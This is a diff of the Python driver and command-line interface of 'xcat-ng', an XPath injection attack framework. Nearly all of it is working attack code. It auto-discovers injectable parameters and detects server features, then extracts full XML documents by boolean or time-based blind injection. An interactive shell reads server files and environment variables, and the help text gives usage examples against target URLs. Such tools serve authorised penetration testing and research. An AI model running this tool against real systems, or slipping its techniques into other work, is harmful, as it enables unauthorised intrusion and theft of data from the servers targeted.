-        print("[*] Testing injections on all parameters...")
-        baseline_bodies = await build_baseline(engine)
-        result = await auto_discover(engine, baseline_bodies)
-        if result:
-            param, method, inj = result
-            print(f"\n{bold('Vulnerable parameter:')} {green(param)}")
-            print(f"{bold('Method:')} {yellow(method.value)}")
-            print(f"{bold('Injector:')} {yellow(inj.name)}")
-            print(f"{bold('Example:')} {inj.example}")
-
-            print("\n[*] Detecting features...")
-            ctx.target_param = param
-            ctx.injector     = inj
-            feats = await detect_features(engine)
-            ctx.features.update(feats)
-        else:
-            print(red("No injection detected in any parameter."))
-    finally:
-        await ctx.close()
-
-
-async def run_discover(ctx: AttackContext, state: State):
-    """Auto-discover + extract."""
-    engine = Engine(ctx)
-    await ctx.start()
-    try:
-        print("[*] Building baseline...")
-        baseline_bodies = await build_baseline(engine)
-
-        print("[*] Auto-discovering injection points...")
-        result = await auto_discover(engine, baseline_bodies)
-
-        if not result:
-            print(red("No injection found. Exiting."))
-            return
-
-        param, method, inj = result
-        print(f"\n{bold('Found:')} {green(param)} via {yellow(inj.name)} ({method.value})")
-
-        ctx.target_param = param
-        ctx.injector     = inj
-
-        print("\n[*] Detecting features...")
-        feats = await detect_features(engine)
-        ctx.features.update(feats)
-
-        if method == ExtractionMethod.NORMAL:
-            print("\n[*] Attempting NORMAL extraction...")
-            val = await extract_normal(engine, param, inj)
-            if val:
-                print(f"\n{bold('Extracted:')}\n{val}")
-            else:
-                print(yellow("NORMAL extraction found nothing. Falling back to boolean..."))
-                method = ExtractionMethod.BOOLEAN
-
-        if method == ExtractionMethod.BOOLEAN:
-            print("\n[*] Extracting root node name (boolean)...")
-            root_name = await get_string_boolean(engine, "name(/*)", ctx.fast_mode)
-            print(f"Root node: {green(root_name)}")
-            state.data["root_name"] = root_name
-            state.save()
-
-            print("\n[*] BFS XML traversal...")
-            nodes = await get_nodes_bfs(engine, "/*")
-            print()
-            print_xml_tree(nodes)
-
-        elif method == ExtractionMethod.TIME:
-            # threshold estimation
-            print("\n[*] Estimating time threshold...")
-            times = []
-            for _ in range(5):
-                _, _, t = await engine.send_raw({})
-                times.append(t)
-            mean_base = statistics.mean(times)
-            threshold = mean_base + 3.0
-            print(f"Threshold: {threshold:.2f}s")
-
-            print("\n[*] Extracting root node name (time-based)...")
-            root_name = await get_string_time(engine, "name(/*)", threshold, ctx.fast_mode)
-            print(f"Root node: {green(root_name)}")
-
-    finally:
-        await ctx.close()
-
-# ─────────────────────────────────────────────
-# CLI
-# ─────────────────────────────────────────────
-
-def build_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(
-        prog="xcat-ng",
-        description="Modern XPath Injection Framework",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=__doc__,
-    )
-    sub = p.add_subparsers(dest="command", required=True)
-
-    # shared options
-    def add_common(sp):
-        g = sp.add_argument_group("Request")
-        g.add_argument("-r", "--request",    help="Burp-style raw HTTP request file")
-        g.add_argument("--url",              help="Target URL (alternative to -r)")
-        g.add_argument("--method",           default="GET")
-        g.add_argument("--param",            help="Target parameter name")
-        g.add_argument("--param-value",      help="Normal value of target parameter", default="")
-        g.add_argument("--extra-param", nargs="*", metavar="K=V",
-                       help="Additional parameters (key=value)")
-        g.add_argument("--header",  nargs="*", metavar="K:V")
-        g.add_argument("--body-param", nargs="*", metavar="K=V")
-
-        g2 = sp.add_argument_group("Oracle")
-        g2.add_argument("--true-string",  help="String that indicates TRUE response")
-        g2.add_argument("--false-string", help="String that indicates FALSE response")
-        g2.add_argument("--true-code",    type=int, help="HTTP status for TRUE")
-        g2.add_argument("--false-code",   type=int, help="HTTP status for FALSE")
-
-        g3 = sp.add_argument_group("Options")
-        g3.add_argument("--mode",        choices=["safe", "aggressive"], default="safe")
-        g3.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
-        g3.add_argument("--fast",        action="store_true")
-        g3.add_argument("--timeout",     type=int, default=DEFAULT_TIMEOUT)
-        g3.add_argument("--proxy",       help="HTTP proxy (e.g. http://127.0.0.1:8080)")
-        g3.add_argument("--resume",      help="Resume state JSON file")
-        g3.add_argument("--tamper",      help="Path to tamper.py (must export tamper(ctx,args))")
-        g3.add_argument("--oob",         help="host:port for OOB server (requires aiohttp)")
-        g3.add_argument("--enable",      nargs="*", help="Force-enable features")
-        g3.add_argument("--disable",     nargs="*", help="Force-disable features")
-
-    for name in ("run", "shell", "detect", "discover"):
-        sp = sub.add_parser(name, help={
-            "run":      "Extract full XML tree",
-            "shell":    "Interactive XCat shell",
-            "detect":   "Detect injection points and features",
-            "discover": "Auto-discover injection and extract",
-        }[name])
-        add_common(sp)
-        if name == "discover":
-            sp.add_argument("--patterns", nargs="*", help="Regex patterns for NORMAL extraction")
-
-    return p
-
-
-def _parse_kv(items, sep="=") -> Dict[str, str]:
-    out = {}
-    for item in (items or []):
-        if sep in item:
-            k, v = item.split(sep, 1)
-            out[k.strip()] = v.strip()
-    return out
-
-
-def build_ctx(args) -> Tuple[AttackContext, State]:
-    # --- Parse request ---
-    if args.request:
+def build_context(args: argparse.Namespace) -> AttackContext:
+    if getattr(args, "request", None):
         req = ParsedRequest.from_burp(args.request)
-    elif args.url:
-        headers    = {}
-        for h in (args.header or []):
+    elif getattr(args, "url", None):
+        headers: Dict[str, str] = {}
+        for h in (getattr(args, "header", None) or []):
             if ":" in h:
-                k, v = h.split(":", 1)
+                k, _, v = h.partition(":")
                 headers[k.strip()] = v.strip()
-        extra_params = _parse_kv(args.extra_param or [])
-        if args.param:
-            extra_params[args.param] = args.param_value or ""
-        body = _parse_kv(args.body_param or [])
+        params: Dict[str, str] = {}
+        for p in (getattr(args, "param_values", None) or []):
+            if "=" in p:
+                k, _, v = p.partition("=")
+                params[k] = v
+        if getattr(args, "target_param", None):
+            params.setdefault(args.target_param, "")
+        body: Dict[str, str] = {}
+        for b in (getattr(args, "body_param", None) or []):
+            if "=" in b:
+                k, _, v = b.partition("=")
+                body[k] = v
         req = ParsedRequest.from_args(
             url=args.url, method=args.method,
-            params=extra_params, headers=headers, body=body,
+            params=params, headers=headers, body=body
         )
     else:
-        sys.exit("Either -r/--request or --url is required.")
+        sys.exit("[-] Provide -r/--request FILE  or  --url URL")
 
-    # --- Identify target param ---
-    target_param = getattr(args, "param", None)
-    if not target_param:
-        all_params = req.all_params
-        if len(all_params) == 1:
-            target_param = next(iter(all_params))
-        else:
-            target_param = next(iter(all_params), "")
+    if not any([
+        getattr(args, "true_string",  None),
+        getattr(args, "true_code",    None),
+        getattr(args, "false_string", None),
+        getattr(args, "false_code",   None),
+    ]):
+        sys.exit(
+            "[-] Specify at least one oracle flag:\n"
+            "    --true-string TEXT  --true-code CODE\n"
+            "    --false-string TEXT --false-code CODE"
+        )
 
-    # --- Match function ---
-    if not any([args.true_string, args.false_string, args.true_code, args.false_code]):
-        sys.exit("At least one of --true-string / --false-string / --true-code / --false-code required.")
+    target = getattr(args, "target_param", None)
+    if not target:
+        target = next(iter(req.all_params), None) or ""
+        if target:
+            warn(f"No --param specified, auto-selected: {target!r}")
 
-    match_fn = make_match_fn(
-        true_string=args.true_string,
-        false_string=args.false_string,
-        true_code=args.true_code,
-        false_code=args.false_code,
-    )
-
-    # --- Tamper ---
     tamper_fn = None
     if getattr(args, "tamper", None):
-        spec   = importlib.util.spec_from_file_location("tamper", args.tamper)
-        mod    = importlib.util.module_from_spec(spec)
+        spec = importlib.util.spec_from_file_location("tamper", args.tamper)
+        mod  = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(mod)
         tamper_fn = getattr(mod, "tamper", None)
 
-    # --- OOB ---
-    oob_host = None
-    if getattr(args, "oob", None):
-        oob_host = args.oob  # "host:port"
-
-    state = State(getattr(args, "resume", None))
-
     ctx = AttackContext(
         req=req,
-        target_param=target_param,
-        match_fn=match_fn,
-        mode=Mode(args.mode),
+        target_param=target,
+        match_fn=build_match_fn(args),
         concurrency=args.concurrency,
-        fast_mode=args.fast,
-        injector=None,
-        tamper_fn=tamper_fn,
-        oob_host=oob_host,
+        fast_mode=getattr(args, "fast", False),
         timeout=args.timeout,
-        proxy=args.proxy,
+        proxy=getattr(args, "proxy", None),
+        tamper_fn=tamper_fn,
     )
 
     for feat in (getattr(args, "enable", None) or []):
@@ -1302,70 +1099,392 @@ def build_ctx(args) -> Tuple[AttackContext, State]:
     for feat in (getattr(args, "disable", None) or []):
         ctx.features[feat] = False
 
-    return ctx, state
+    return ctx
 
 
-async def async_main(args):
-    ctx, state = build_ctx(args)
+async def _setup_and_detect(
+    ctx: AttackContext, engine: Engine
+) -> Optional[Tuple[ExtractionMethod, Injector, Any]]:
+    """Build baseline, find injection, detect features. Returns (method, inj, extra)."""
+    info("Building response baseline...")
+    baseline = await _build_baseline(engine)
 
-    cmd = args.command
-    if cmd == "run":
-        # Auto-detect injection first
-        engine = Engine(ctx)
-        await ctx.start()
-        try:
-            print("[*] Building baseline...")
-            baseline = await build_baseline(engine)
-            print("[*] Auto-discovering injection...")
-            result = await auto_discover(engine, baseline)
-            if result:
-                param, method, inj = result
-                ctx.target_param = param
-                ctx.injector     = inj
-            print("[*] Detecting features...")
-            feats = await detect_features(engine)
-            ctx.features.update(feats)
-            print("\n[*] Extracting XML tree (BFS)...")
-            nodes = await get_nodes_bfs(engine, state.data.get("root_expr", "/*"))
+    info("Probing for injection points...")
+    result = await auto_discover(engine, baseline)
+
+    if not result:
+        err("No injection found in any parameter.")
+        warn("Troubleshooting tips:")
+        warn("  Verify that --true-string is present in a normal response")
+        warn("  Use ! prefix to negate: --true-string='!No results'")
+        warn("  Try --true-code=200 or --false-code=404")
+        warn("  Use -v for verbose debug output")
+        return None
+
+    param, method, inj, extra = result
+    ctx.target_param = param
+    ctx.injector     = inj
+
+    ok(
+        f"Injection found  "
+        f"param={_c(param, T.CYAN)}  "
+        f"method={_c(method.value, T.YELLOW)}  "
+        f"injector={_c(inj.name, T.YELLOW)}"
+    )
+    print(f"  Example: {_c(inj.example, T.GRAY)}")
+    if method == ExtractionMethod.TIME:
+        ok(f"Time threshold: {extra:.3f}s")
+    print()
+
+    info("Detecting server features...")
+    feats = await detect_features(engine)
+    ctx.features.update(feats)
+    print()
+
+    return method, inj, extra
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Command implementations
+# ══════════════════════════════════════════════════════════════════════════════
+
+async def cmd_detect(args: argparse.Namespace):
+    ctx    = build_context(args)
+    engine = Engine(ctx)
+    await ctx.start()
+    try:
+        await _setup_and_detect(ctx, engine)
+    finally:
+        await ctx.close()
+
+
+async def cmd_run(args: argparse.Namespace):
+    ctx    = build_context(args)
+    engine = Engine(ctx)
+    await ctx.start()
+    try:
+        result = await _setup_and_detect(ctx, engine)
+        if not result:
+            sys.exit(1)
+
+        method, inj, extra = result
+        threshold = extra if method == ExtractionMethod.TIME else 0.0
+
+        # If Normal mode leaked something, show it and then also do boolean BFS
+        if method == ExtractionMethod.NORMAL and extra:
+            ok("Normal extraction result:")
+            print(_c(extra, T.GREEN))
             print()
-            print_xml_tree(nodes)
-        finally:
-            await ctx.close()
+            info("Switching to boolean mode for full XML tree extraction...")
+            method    = ExtractionMethod.BOOLEAN
+            threshold = 0.0
 
-    elif cmd == "shell":
-        engine = Engine(ctx)
-        await ctx.start()
+        info("Extracting XML document  (live output below, progress on stderr)...")
+        print()
+        print(_c("─" * 64, T.GRAY))
+
+        xml_lines: List[str] = []
         try:
-            print("[*] Building baseline...")
-            baseline = await build_baseline(engine)
-            print("[*] Auto-discovering injection...")
-            result = await auto_discover(engine, baseline)
-            if result:
-                param, method, inj = result
-                ctx.target_param = param
-                ctx.injector     = inj
-            print("[*] Detecting features...")
-            feats = await detect_features(engine)
-            ctx.features.update(feats)
-            shell = Shell(engine)
-            await shell.run()
-        finally:
-            await ctx.close()
+            await exfiltrate_node(
+                engine, "/*", depth=0,
+                max_depth=getattr(args, "max_depth", 12),
+                max_children=getattr(args, "max_children", 40),
+                xml_lines=xml_lines,
+                method=method, threshold=threshold,
+                fast=ctx.fast_mode,
+            )
+        except KeyboardInterrupt:
+            warn("Interrupted — partial result below")
 
-    elif cmd == "detect":
-        await run_detect(ctx)
+        # Final clean summary
+        print()
+        print(_c("═" * 64, T.BOLD))
+        print(_c("  EXTRACTED XML", T.BOLD))
+        print(_c("═" * 64, T.BOLD))
+        for ln in xml_lines:
+            s = ln.strip()
+            print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
+        print(_c("═" * 64, T.BOLD))
 
-    elif cmd == "discover":
-        await run_discover(ctx, state)
+        if getattr(args, "output", None):
+            Path(args.output).write_text("\n".join(xml_lines))
+            ok(f"Saved → {args.output}")
+    finally:
+        await ctx.close()
 
+
+async def cmd_shell(args: argparse.Namespace):
+    ctx    = build_context(args)
+    engine = Engine(ctx)
+    await ctx.start()
+    try:
+        result = await _setup_and_detect(ctx, engine)
+        if not result:
+            sys.exit(1)
+        method, _, extra = result
+        threshold = extra if method == ExtractionMethod.TIME else 0.0
+        await shell_loop(engine, method, threshold)
+    finally:
+        await ctx.close()
+
+
+def cmd_injections(_args: argparse.Namespace):
+    print(_c("Supported injection templates:\n", T.BOLD))
+    for i, inj in enumerate(INJECTORS, 1):
+        fp = inj.false_pre or inj.pre
+        fs = inj.false_suf or inj.suf
+        print(f"  {_c(str(i), T.CYAN)}. {inj.name}")
+        print(f"     Example  : {_c(inj.example, T.GRAY)}")
+        print(f"     TRUE     : {_c(inj.pre, T.GREEN)}{{condition}}{_c(inj.suf, T.GREEN)}")
+        print(f"     FALSE    : {_c(fp, T.RED)}1=2{_c(fs, T.RED)}")
+        print()
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Argument parser
+# ══════════════════════════════════════════════════════════════════════════════
+
+def build_parser() -> argparse.ArgumentParser:
+    root = argparse.ArgumentParser(
+        prog="xcat-ng",
+        description=__doc__,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    root.add_argument("-v", "--verbose", action="store_true",
+                      help="Enable verbose/debug output")
+    root.add_argument("--version", action="version", version="xcat-ng v3")
+
+    sub = root.add_subparsers(dest="command", required=True)
+
+    # ── detect ──────────────────────────────────────────────────────────────
+    p_detect = sub.add_parser(
+        "detect",
+        help="Probe all parameters, identify injection type and server features",
+        description="""
+DETECT — identify the injection point and server capabilities
+=============================================================
+Probes every parameter in the request using all injection templates.
+Prints the detected injection type and all server XPath features.
+Does NOT extract data. Use 'run' or 'shell' for extraction.
+
+Detection order per parameter:
+  1. Normal  — true payload returns richer content than baseline (fastest)
+  2. Boolean — true vs false responses differ measurably (reliable)
+  3. Time    — true payload causes significant delay (last resort)
+
+Examples:
+  xcat-ng detect -r burp.txt --true-string "Welcome"
+  xcat-ng detect -r burp.txt --true-string "!Error" -v
+  xcat-ng detect --url http://host/page --param q --param-values q=test \\
+                 --true-string "found"
+  xcat-ng detect -r burp.txt --true-code 200 --false-code 404
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+
+    # ── run ─────────────────────────────────────────────────────────────────
+    p_run = sub.add_parser(
+        "run",
+        help="Auto-detect injection, then extract the full XML document",
+        description="""
+RUN — extract the full XML document from the target
+====================================================
+Detects the injection point and features, then extracts the entire XML
+document using the best available method.
+
+Live output: XML tags are printed immediately as they are found.
+A clean summary is printed at the end.
+
+Extraction methods tried in order:
+  1. Normal  — data read directly from response body (fastest, no oracle)
+  2. Boolean — blind char-by-char with binary search  (reliable)
+  3. Time    — timing-based blind extraction           (slow, last resort)
+
+Character search strategies (auto-selected by features):
+  codepoint-search  → O(log N) binary search via string-to-codepoints
+  substring-search  → O(log N) binary search via substring-before
+  fallback          → O(N) frequency-ordered linear scan
+
+Examples:
+  xcat-ng run -r burp.txt --true-string "Welcome"
+  xcat-ng run -r burp.txt --true-string "!Error" --fast -c 20
+  xcat-ng run -r burp.txt --true-code 200 -o result.xml --max-depth 5
+  xcat-ng run --url http://host/login --param user --param-values user=admin \\
+              --true-string "logged in" -m POST --body-param pass=x
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    p_run.add_argument("-o", "--output", metavar="FILE",
+                       help="Save extracted XML to this file")
+    p_run.add_argument("--max-depth", type=int, default=12, metavar="N",
+                       help="Maximum XML tree depth to traverse (default: 12)")
+    p_run.add_argument("--max-children", type=int, default=40, metavar="N",
+                       help="Maximum children per element (default: 40)")
+
+    # ── shell ────────────────────────────────────────────────────────────────
+    p_shell = sub.add_parser(
+        "shell",
+        help="Auto-detect injection, then open an interactive XPath shell",
+        description="""
+SHELL — interactive XPath extraction shell
+==========================================
+Detects the injection point and features, then opens an interactive prompt
+where you can run arbitrary XPath expressions against the target.
+
+Shell commands:
+  get  <xpath>      Extract string value of any XPath expression
+  count <xpath>     Count nodes matching an XPath expression
+  xml  [xpath]      Dump XML subtree (default: /*)
+  env  [name]       List env vars or get a specific one by name
+  file <path>       Read a file (uses unparsed-text() or doc())
+  pwd               Print working directory (base-uri / document-uri)
+  time              Print server date/time
+  find <name>       Search for a file by traversing parent directories
+  features          List all detected feature flags with on/off status
+  toggle <feature>  Manually toggle a feature flag
+  help              Show all shell commands
+  exit              Exit the shell
+
+Examples:
+  xcat-ng shell -r burp.txt --true-string "Welcome"
+  xcat-ng shell --url http://host/api --param token --param-values token=abc \\
+                --true-code 200 --false-code 403
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+
+    # ── injections ───────────────────────────────────────────────────────────
+    sub.add_parser(
+        "injections",
+        help="List all supported injection templates with true/false payload examples",
+    )
+
+    # ── Shared arguments ─────────────────────────────────────────────────────
+    def add_common(p: argparse.ArgumentParser):
+        src = p.add_argument_group(
+            "Request source  (choose one)"
+        )
+        me = src.add_mutually_exclusive_group()
+        me.add_argument(
+            "-r", "--request", metavar="FILE",
+            help="Burp Suite raw HTTP request file  (all params parsed automatically)",
+        )
+        me.add_argument(
+            "--url", metavar="URL",
+            help="Target URL  (pair with --param and --param-values)",
+        )
+
+        pg = p.add_argument_group("Parameters  (used with --url)")
+        pg.add_argument(
+            "--param", dest="target_param", metavar="NAME",
+            help="Name of the parameter to inject into",
+        )
+        pg.add_argument(
+            "--param-values", nargs="*", metavar="KEY=VALUE",
+            help="All query/URL parameters, e.g.  q=hello page=1",
+        )
+        pg.add_argument(
+            "--body-param", nargs="*", metavar="KEY=VALUE",
+            help="POST body parameters (used with -m POST)",
+        )
+        pg.add_argument(
+            "-m", "--method", default="GET", metavar="METHOD",
+            help="HTTP method: GET POST PUT … (default: GET)",
+        )
+        pg.add_argument(
+            "--header", nargs="*", metavar="'Name: value'",
+            help="Additional request headers",
+        )
+
+        og = p.add_argument_group(
+            "Oracle  (at least one required)",
+        )
+        og.add_argument(
+            "--true-string", metavar="TEXT",
+            help=(
+                "String that is present in a TRUE response body. "
+                "Prefix with ! to negate (true when string is absent)."
+            ),
+        )
+        og.add_argument(
+            "--true-code", metavar="CODE",
+            help=(
+                "HTTP status code for a TRUE response. "
+                "Prefix with ! to negate, e.g. !404"
+            ),
+        )
+        og.add_argument(
+            "--false-string", metavar="TEXT",
+            help="String indicating a FALSE response (complementary oracle).",
+        )
+        og.add_argument(
+            "--false-code", metavar="CODE",
+            help="HTTP status code for a FALSE response.",
+        )
+
+        xo = p.add_argument_group("Options")
+        xo.add_argument(
+            "-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, metavar="N",
+            help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})",
+        )
+        xo.add_argument(
+            "--fast", action="store_true",
+            help=f"Cap extracted strings at {FAST_MODE_LEN} chars for speed",
+        )
+        xo.add_argument(
+            "--timeout", type=int, default=DEFAULT_TIMEOUT, metavar="SEC",
+            help=f"Per-request timeout in seconds (default: {DEFAULT_TIMEOUT})",
+        )
+        xo.add_argument(
+            "--proxy", metavar="URL",
+            help="HTTP proxy, e.g. http://127.0.0.1:8080",
+        )
+        xo.add_argument(
+            "--tamper", metavar="FILE",
+            help="Python script to tamper requests (must export tamper(ctx, kwargs))",
+        )
+        xo.add_argument(
+            "--enable", nargs="*", metavar="FEATURE",
+            help="Force-enable a feature, bypassing auto-detection",
+        )
+        xo.add_argument(
+            "--disable", nargs="*", metavar="FEATURE",
+            help="Force-disable a feature",
+        )
+
+    for p in (p_detect, p_run, p_shell):
+        add_common(p)
+
+    return root
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Entry point
+# ══════════════════════════════════════════════════════════════════════════════
 
 def main():
+    global _verbose
+
+    print(BANNER)
     parser = build_parser()
     args   = parser.parse_args()
-    try:
-        asyncio.run(async_main(args))
-    except KeyboardInterrupt:
-        print("\n[!] Interrupted.")
+    _verbose = getattr(args, "verbose", False)
+
+    dispatch = {
+        "detect":     cmd_detect,
+        "run":        cmd_run,
+        "shell":      cmd_shell,
+        "injections": cmd_injections,
+    }
+
+    fn = dispatch[args.command]
+    if args.command == "injections":
+        fn(args)
+    else:
+        try:
+            asyncio.run(fn(args))
+        except KeyboardInterrupt:
+            warn("Interrupted.")
 
 
 if __name__ == "__main__":
